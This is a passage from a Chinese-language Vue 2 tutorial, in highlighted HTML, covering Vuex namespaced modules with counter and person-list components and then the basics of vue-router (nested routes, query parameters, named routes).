class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;添加的人必须姓王！&#x27;</span>)<br>            &#125;<br>        &#125;,<br>        <span class="hljs-title function_">addPersonServer</span>(<span class="hljs-params">context</span>)&#123;<br>            axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://api.uixsj.cn/hitokoto/get?type=social&#x27;</span>).<span class="hljs-title function_">then</span>(<br>                <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>                    context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD_PERSON&#x27;</span>,&#123;<span class="hljs-attr">id</span>:<span class="hljs-title function_">nanoid</span>(),<span class="hljs-attr">name</span>:response.<span class="hljs-property">data</span>&#125;)<br>                &#125;,<br>                <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123; <span class="hljs-title function_">alert</span>(error.<span class="hljs-property">message</span>) &#125;<br>            )<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">mutations</span>:&#123;<br>        <span class="hljs-title function_">ADD_PERSON</span>(<span class="hljs-params">state,value</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutations中的ADD_PERSON被调用了&#x27;</span>)<br>            state.<span class="hljs-property">personList</span>.<span class="hljs-title function_">unshift</span>(value)<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">state</span>:&#123;<br>        <span class="hljs-attr">personList</span>:[&#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;欧耶&#x27;</span>&#125;]<br>    &#125;,<br>    <span class="hljs-attr">getters</span>:&#123;<br>        <span class="hljs-title function_">firstPersonName</span>(<span class="hljs-params">state</span>)&#123; <span class="hljs-keyword">return</span> state.<span class="hljs-property">personList</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span> &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* //该文件用于创建Vuex中最为核心的store</span><br><span class="hljs-comment">import Vue from &#x27;vue&#x27;</span><br><span class="hljs-comment">//引入Vuex</span><br><span class="hljs-comment">import Vuex from &#x27;vuex&#x27;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">import axios from &quot;axios&quot;</span><br><span class="hljs-comment">import &#123; nanoid &#125; from &quot;nanoid&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//应用Vuex插件</span><br><span class="hljs-comment">Vue.use(Vuex)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const countAbout = &#123;</span><br><span class="hljs-comment">    namespaced: true,</span><br><span class="hljs-comment">    actions: &#123;</span><br><span class="hljs-comment">        addOdd(context, value) &#123;</span><br><span class="hljs-comment">            console.log(&quot;actions中的addOdd被调用了&quot;)</span><br><span class="hljs-comment">            if (context.state.sum % 2) &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        addWait(context, value) &#123;</span><br><span class="hljs-comment">            console.log(&quot;actions中的addWait被调用了&quot;)</span><br><span class="hljs-comment">            setTimeout(() =&gt; &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD&#x27;, value)</span><br><span class="hljs-comment">            &#125;, 500)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    mutations: &#123;</span><br><span class="hljs-comment">        ADD(state, value) &#123;</span><br><span class="hljs-comment">            state.sum += value</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        SUBTRACT(state, value) &#123;</span><br><span class="hljs-comment">            state.sum -= value</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    state: &#123;</span><br><span class="hljs-comment">        sum: 0,</span><br><span class="hljs-comment">        school: &#x27;尚硅谷&#x27;,</span><br><span class="hljs-comment">        subject: &#x27;前端&#x27;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    getters: &#123;</span><br><span class="hljs-comment">        bigSum(state) &#123;</span><br><span class="hljs-comment">            return state.sum * 10</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const personAbout = &#123;</span><br><span class="hljs-comment">    namespaced: true,</span><br><span class="hljs-comment">    actions: &#123;</span><br><span class="hljs-comment">        addPersonWang(context, value) &#123;</span><br><span class="hljs-comment">            if (value.name.indexOf(&#x27;王&#x27;) === 0) &#123;</span><br><span class="hljs-comment">                context.commit(&#x27;ADD_PERSON&#x27;, value)</span><br><span class="hljs-comment">            &#125; else &#123;</span><br><span class="hljs-comment">                alert(&#x27;添加的人必须姓王！&#x27;)</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;,</span><br><span class="hljs-comment">        addPersonServer(context) &#123;</span><br><span class="hljs-comment">            axios.get(&#x27;http://api.uixsj.cn/hitokoto/get?type=social&#x27;).then(</span><br><span class="hljs-comment">                response =&gt; &#123;</span><br><span class="hljs-comment">                    context.commit(&#x27;ADD_PERSON&#x27;, &#123;</span><br><span class="hljs-comment">                        id: nanoid(),</span><br><span class="hljs-comment">                        name: response.data</span><br><span class="hljs-comment">                    &#125;)</span><br><span class="hljs-comment">                &#125;,</span><br><span class="hljs-comment">                error =&gt; &#123;</span><br><span class="hljs-comment">                    alert(error.message)</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            )</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    mutations: &#123;</span><br><span class="hljs-comment">        ADD_PERSON(state, value) &#123;</span><br><span class="hljs-comment">            console.log(&#x27;mutations中的ADD_PERSON被调用了&#x27;,value)</span><br><span class="hljs-comment">            state.personList.unshift(value)</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    state: &#123;</span><br><span class="hljs-comment">        personList: []</span><br><span class="hljs-comment">    &#125;,</span><br><span class="hljs-comment">    getters: &#123;</span><br><span class="hljs-comment">        firstPersonName(state) &#123;</span><br><span class="hljs-comment">            if(!state.personList[0]) return </span><br><span class="hljs-comment">            return state.personList[0].name </span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">const store = new Vuex.Store(&#123;</span><br><span class="hljs-comment">    modules: &#123;</span><br><span class="hljs-comment">        countAbout,</span><br><span class="hljs-comment">        personAbout</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">export default store */</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-keyword">import</span> countOptions <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./count&#x27;</span><span class="hljs-comment">// 引入count</span><br><span class="hljs-keyword">import</span> personOptions <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./person&#x27;</span><span class="hljs-comment">// 引入person</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//创建并暴露store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>    <span class="hljs-attr">modules</span>:&#123;<br>        <span class="hljs-attr">countAbout</span>:countOptions,<br>        <span class="hljs-attr">personAbout</span>:personOptions,<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>count.vue</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;<br>&lt;h3&gt;当前求和的10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;<br>&lt;h3&gt;我是&#123;&#123; name &#125;&#125;，我在&#123;&#123; school &#125;&#125;学习&lt;/h3&gt;<br>&lt;h3 style=&quot;color:red&quot;&gt;Person组件的总人数是：&#123;&#123; personList.length &#125;&#125;&lt;/h3&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;<br>&lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;<br>mapState,<br>mapGetters,<br>mapMutations,<br>mapActions<br>&#125; from &#x27;vuex&#x27;<br><br>export default &#123;<br>name: &#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n: 1, // 用户选择的数字<br>&#125;<br>&#125;,<br>computed: &#123;<br>...mapState(&#x27;countAbout&#x27;, [&#x27;sum&#x27;, &#x27;school&#x27;, &#x27;name&#x27;]),<br>...mapState(&#x27;personAbout&#x27;, [&#x27;personList&#x27;]),<br>...mapGetters(&#x27;countAbout&#x27;, [&#x27;bigSum&#x27;]),<br>&#125;,<br>methods: &#123;<br>...mapMutations(&#x27;countAbout&#x27;, &#123;<br>increment: &#x27;ADD&#x27;,<br>decrement: &#x27;SUBTRACT&#x27;<br>&#125;),<br>...mapActions(&#x27;countAbout&#x27;, &#123;<br>incrementOdd: &#x27;addOdd&#x27;,<br>incrementWait: &#x27;addWait&#x27;<br>&#125;)<br>&#125;,<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>button &#123;<br>margin-left: 5px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>​    </p><p>person.vue</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;h1&gt;人员列表&lt;/h1&gt;<br>        &lt;h3 style=&quot;color:red&quot;&gt;Count组件求和为：&#123;&#123; sum &#125;&#125;&lt;/h3&gt;<br>        &lt;h3&gt;列表中第一个人的名字是：&#123;&#123; firstPersonName &#125;&#125;&lt;/h3&gt;<br>        &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;name&quot;&gt;<br>        &lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;<br>        &lt;button @click=&quot;addWang&quot;&gt;添加一个姓王的人&lt;/button&gt;<br>        &lt;button @click=&quot;addPerson&quot;&gt;随机添加一个人&lt;/button&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123; p.name &#125;&#125;&lt;/li&gt;<br>        &lt;/ul&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    import &#123;<br>        nanoid<br>    &#125; from &#x27;nanoid&#x27;<br>    export default &#123;<br>        name: &#x27;Person&#x27;,<br>        data() &#123;<br>            return &#123;<br>                name: &#x27;&#x27;<br>            &#125;<br>        &#125;,<br>        computed: &#123;<br>            personList() &#123;<br>                return this.$store.state.personAbout.personList<br>            &#125;,<br>            sum() &#123;<br>                return this.$store.state.countAbout.sum<br>            &#125;,<br>            firstPersonName() &#123;<br>                return this.$store.getters[&#x27;personAbout/firstPersonName&#x27;]<br>            &#125;<br>        &#125;,<br>        methods: &#123;<br>            add() &#123;<br>                const personObj = &#123;<br>                    id: nanoid(),<br>                    name: this.name<br>                &#125;<br>                this.$store.commit(&#x27;personAbout/ADD_PERSON&#x27;, personObj)<br>                this.name = &#x27;&#x27;<br>            &#125;,<br>            addWang() &#123;<br>                const personObj = &#123;<br>                    id: nanoid(),<br>                    name: this.name<br>                &#125;<br>                this.$store.dispatch(&#x27;personAbout/addPersonWang&#x27;, personObj)<br>                this.name = &#x27;&#x27;<br>            &#125;,<br>            addPerson() &#123;<br>                this.$store.dispatch(&#x27;personAbout/addPersonServer&#x27;)<br>            &#125;<br>        &#125;,<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>​    </p><h1 id="4-路由"><a href="#4-路由" class="headerlink" title="4. 路由"></a>4. 路由</h1><p><strong>相关理解</strong></p><ol><li>vue-router 的理解</li></ol><ul><li><p>vue的一个插件库，专门用来实现SPA应用</p><ol start="2"><li>对SPA应用的理解</li></ol></li><li><p>单页Web应用（single page web application，SPA）</p></li><li><p>整个应用只有一个完整的页面</p></li><li><p>点击页面中的导航链接不会刷新页面，只会做页面的局部更新</p></li><li><p>数据需要通过ajax请求获取</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221118221726021.png" alt="image-20221118221726021"></p></li></ul><p><strong>路由的理解</strong></p><ol><li><p>什么是路由? </p><ul><li>一个路由就是一组映射关系（key - value）</li><li>key为路径，value可能是function或componen</li></ul></li><li><p>路由分类</p><ul><li>后端路由<ol><li>理解：value是function，用于处理客户端提交的请求</li><li>工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据</li></ol></li><li>前端路由<ol><li>理解：value是component，用于展示页面内容</li><li>工作过程：当浏览器的路径改变时，对应的组件就会显示</li></ol></li></ul></li></ol><h2 id="4-1-基本使用"><a href="#4-1-基本使用" class="headerlink" title="4.1 基本使用"></a>4.1 基本使用</h2><ol><li><p>安装vue-router，命令：<code>npm i vue-router</code></p><p>版本问题 Vue2版本使用 <code>npm i vue-router@3</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//引入VueRouter</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">//引入Luyou 组件</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/About&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../components/Home&#x27;</span><br><br><span class="hljs-comment">//创建router实例对象，去管理一组一组的路由规则</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br><span class="hljs-attr">routes</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/about&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">About</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span><br>&#125;<br>]<br>&#125;)<br><br><span class="hljs-comment">//暴露router</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br></code></pre></td></tr></table></figure><ol start="4"><li><p>实现切换（active-class可配置高亮样式）</p><p><code>&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</code></p></li><li><p>指定展示位置</p><p><code>&lt;router-view&gt;&lt;/router-view&gt;</code></p></li></ol><h2 id="4-2-几个注意点"><a href="#4-2-几个注意点" class="headerlink" title="4.2 几个注意点"></a>4.2 几个注意点</h2><ol><li><p>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</p><p>比如上一节的案例就可以修改为 </p><p>src&#x2F;pages&#x2F;Home.vue </p><p>src&#x2F;pages&#x2F;About.vue </p><p>src&#x2F;router&#x2F;index.js</p><p>src&#x2F;components&#x2F;Banner.vue </p><p>src&#x2F;App.vue</p></li><li><p>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</p></li><li><p>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</p></li><li><p>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</p></li></ol><h2 id="4-3-多级路由（多级路由）"><a href="#4-3-多级路由（多级路由）" class="headerlink" title="4.3 多级路由（多级路由）"></a>4.3 多级路由（多级路由）</h2><pre><code class="hljs">1. 配置路由规则，使用**children**配置项：</code></pre><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">routes</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/about&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">About</span>,<br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span>,<br><span class="hljs-attr">children</span>:[ <span class="hljs-comment">//通过children配置子级路由</span><br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;news&#x27;</span>, <span class="hljs-comment">//此处一定不要写：/news</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">News</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;message&#x27;</span>,<span class="hljs-comment">//此处一定不要写：/message</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Message</span><br>&#125;<br>]<br>&#125;<br>]<br><br></code></pre></td></tr></table></figure><ol start="2"><li><p>跳转（要写完整路径）：</p><p><code>&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</code></p></li><li><p>指定展示位置</p><p><code>&lt;router-view&gt;&lt;/router-view&gt;</code></p></li></ol><h2 id="4-4-路由的query参数"><a href="#4-4-路由的query参数" class="headerlink" title="4.4 路由的query参数"></a>4.4 路由的query参数</h2><ol><li>传递参数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;<br>&lt;router-link :to=&quot;/home/message/detail?id=666&amp;title=你好&quot;&gt;跳转&lt;/router-link&gt;<br><br>&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>path:&#x27;/home/message/detail&#x27;,<br>query:&#123;<br>   id:666,<br>            title:&#x27;你好&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;跳转&lt;/router-link&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>接收参数：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span><br>$route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span><br></code></pre></td></tr></table></figure><h2 id="4-5-命名路由"><a href="#4-5-命名路由" class="headerlink" title="4.5 命名路由"></a>4.5 命名路由</h2><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/demo&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Demo</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;test&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Test</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br>           <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-comment">// 给路由命名</span><br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;welcome&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Hello</span>,<br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>简化跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue"> &lt;!--简化前，需要写完整的路径 --&gt;<br>&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;跳转&lt;/router-link&gt;<br><br>&lt;!--简化后，直接通过名字跳转 --&gt;<br>&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;<br><br>&lt;!--简化写法配合传递参数 --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>name:&#x27;hello&#x27;,<br>query:&#123;<br>     id:666,<br>         title:&#x27;你好&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;跳转&lt;/router-link&gt;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="4-6-路由的params参数"><a href="#4-6-路由的params参数" class="headerlink" title="4.6 路由的params参数"></a>4.6 路由的params参数</h2><ol><li><p>配置路由，声明接收<strong>params</strong>参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;/home&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Home</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;news&#x27;</span>,<br><span 